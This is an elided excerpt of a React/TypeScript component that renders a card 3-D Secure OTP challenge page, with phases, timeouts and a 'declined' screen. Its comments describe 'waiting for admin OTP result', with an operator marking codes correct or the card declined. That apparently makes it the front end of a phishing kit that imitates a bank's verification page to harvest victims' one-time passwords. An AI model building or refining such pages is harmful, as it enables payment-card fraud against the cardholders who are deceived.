...
type Phase = 'method' | 'verify' | 'help' | 'processing' | 'failed';

/** If redirect/loading page stays open longer than this → timeout message */
const REDIRECT_TIMEOUT_MS = 30_000;
/** After timeout, auto-return home after this many seconds */
const HOME_COUNTDOWN_SEC = 10;

export type AcsOtpChallengeProps = {
  ...
  /**
   * checking = waiting for admin OTP result (stay on Verify).
   * completed = correct OTP → short redirect then home.
   * declined = correct OTP but card declined / insufficient funds → message on redirect page, auto home 10s.
   */
  externalState?: 'input' | 'checking' | 'failed' | 'idle' | 'completed' | 'declined';
...
function maskPhone(last3?: string | null) {
...
export function AcsOtpChallenge({
  ...
  onRetry,
  onCancel,
}: AcsOtpChallengeProps) {
  const [phase, setPhase] = useState<Phase>('method');
  const [helpFrom, setHelpFrom] = useState<Phase>('method');
  ...
  // Stay on Verify while checking OTP — redirect only for completed or declined
  const view: Phase | 'declined' =
  ...
  return (
    <div className="acs-shell" dir="ltr">
      ...
      {/* Correct OTP but card declined / insufficient credit — message on redirect page */}
      {view === 'declined' && (
        <div className="acs-screen">
          <Header />
          <h1 className="acs-h1">
